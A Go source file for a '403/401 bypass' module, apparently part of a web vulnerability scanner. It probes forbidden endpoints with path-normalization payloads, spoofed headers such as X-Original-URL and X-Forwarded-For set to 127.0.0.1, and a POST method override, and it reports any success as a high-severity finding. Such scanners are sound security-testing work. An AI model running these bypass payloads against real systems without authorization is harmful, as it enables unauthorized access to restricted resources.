package services

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

type Bypass403Tool struct{}

func (t *Bypass403Tool) Name() string {
	return "bypass403"
}

func (t *Bypass403Tool) Run(ctx context.Context, targets []string, threads int) ([]Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 50
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}

		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(5 * time.Second)
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}

		// Initial check
		req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
		if err != nil {
			return nil, nil
		}
		headers := HeadersFromCtx(ctx)
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			return nil, nil
		}
		resp.Body.Close()

		if resp.StatusCode != http.StatusForbidden && resp.StatusCode != http.StatusUnauthorized {
			return nil, nil // Only scan 403/401 endpoints
		}

		parsed, err := url.Parse(target)
		if err != nil {
			return nil, nil
		}

		var events []Event
		var mu sync.Mutex

		// Perform canary check for wildcard 200 OK or CDN behavior
		var hasCanary200 bool
		var canaryLen int64
		var canaryHash string

		canaryURL := parsed.Scheme + "://" + parsed.Host + "/$bbpts_canary_404/"
		canaryReq, err := http.NewRequestWithContext(ctx, "GET", canaryURL, nil)
		if err == nil {
			for k, v := range headers {
				canaryReq.Header.Set(k, v)
			}
			canaryResp, err := client.Do(canaryReq)
			if err == nil {
				if canaryResp.StatusCode == http.StatusOK {
					hasCanary200 = true
					canaryLen, canaryHash = getResponseFingerprint(canaryResp)
				}
				canaryResp.Body.Close()
			}
		}

		// Helper to read and close response
		checkBypassResponse := func(bypassResp *http.Response) bool {
			defer bypassResp.Body.Close()
			if bypassResp.StatusCode != http.StatusOK {
				return false
			}
			bLen, bHash := getResponseFingerprint(bypassResp)
			// A valid bypass must differ from the wildcard 200 canary response.
			if hasCanary200 && bLen == canaryLen && bHash == canaryHash {
				return false
			}
			return true
		}

		// 1. Test Path Normalizations and encoding bypasses
		path := parsed.Path
		pathBypasses := []string{
			// Trailing slash / dot
			target + "/",
			target + "/./",
			target + "/.",
			// Semicolon bypass (Tomcat/Spring)
			target + "..;/",
			parsed.Scheme + "://" + parsed.Host + "/..;" + path,
			// Double slash in path
			parsed.Scheme + "://" + parsed.Host + "//" + strings.TrimPrefix(path, "/"),
			// Case variation (uppercase)
			parsed.Scheme + "://" + parsed.Host + strings.ToUpper(path),
			// URL-encoded space and tab
			parsed.Scheme + "://" + parsed.Host + path + "%20",
			parsed.Scheme + "://" + parsed.Host + path + "%09",
			// Encoded slash prefix
			parsed.Scheme + "://" + parsed.Host + "/%2f" + strings.TrimPrefix(path, "/"),
		}

		for _, bypassURL := range pathBypasses {
			bypassReq, err := http.NewRequestWithContext(ctx, "GET", bypassURL, nil)
			if err != nil {
				continue
			}
			for k, v := range headers {
				bypassReq.Header.Set(k, v)
			}
			bypassResp, err := client.Do(bypassReq)
			if err == nil {
				if checkBypassResponse(bypassResp) {
					mu.Lock()
					events = append(events, NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Path Normalization",
						"url":         bypassURL,
						"description": fmt.Sprintf("Bypassed forbidden page via path normalization: %s", bypassURL),
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "url", bypassURL)
					return events, nil
				}
			}
		}

		// 2. Test Header Overrides
		headerBypasses := []struct {
			name  string
			value string
			url   string
		}{
			{"X-Original-URL", parsed.Path, parsed.Scheme + "://" + parsed.Host + "/"},
			{"X-Rewrite-URL", parsed.Path, parsed.Scheme + "://" + parsed.Host + "/"},
			{"X-Forwarded-For", "127.0.0.1", target},
			{"X-Custom-IP-Authorization", "127.0.0.1", target},
		}

		for _, bypass := range headerBypasses {
			bypassReq, err := http.NewRequestWithContext(ctx, "GET", bypass.url, nil)
			if err != nil {
				continue
			}
			for k, v := range headers {
				bypassReq.Header.Set(k, v)
			}
			bypassReq.Header.Set(bypass.name, bypass.value)
			bypassResp, err := client.Do(bypassReq)
			if err == nil {
				if checkBypassResponse(bypassResp) {
					mu.Lock()
					events = append(events, NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Header Override",
						"header":      bypass.name,
						"description": fmt.Sprintf("Bypassed restriction using header %s: %s", bypass.name, bypass.value),
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "header", bypass.name)
					return events, nil
				}
			}
		}

		// 3. Test Method Overrides
		methodReq, err := http.NewRequestWithContext(ctx, "POST", target, nil)
		if err == nil {
			for k, v := range headers {
				methodReq.Header.Set(k, v)
			}
			methodReq.Header.Set("X-HTTP-Method-Override", "GET")
			methodResp, err := client.Do(methodReq)
			if err == nil {
				if checkBypassResponse(methodResp) {
					mu.Lock()
					events = append(events, NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Method Override",
						"description": "Bypassed restriction using POST method override.",
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "method", "POST override")
				}
			}
		}

		return events, nil
	})
}

func getResponseFingerprint(resp *http.Response) (int64, string) {
	if resp == nil || resp.Body == nil {
		return 0, ""
	}
	limitReader := io.LimitReader(resp.Body, 4096)
	bodyBytes, err := io.ReadAll(limitReader)
	if err != nil {
		return 0, ""
	}
	h := sha256.Sum256(bodyBytes)
	return int64(len(bodyBytes)), hex.EncodeToString(h[:])
}

var _ Tool = (*Bypass403Tool)(nil)
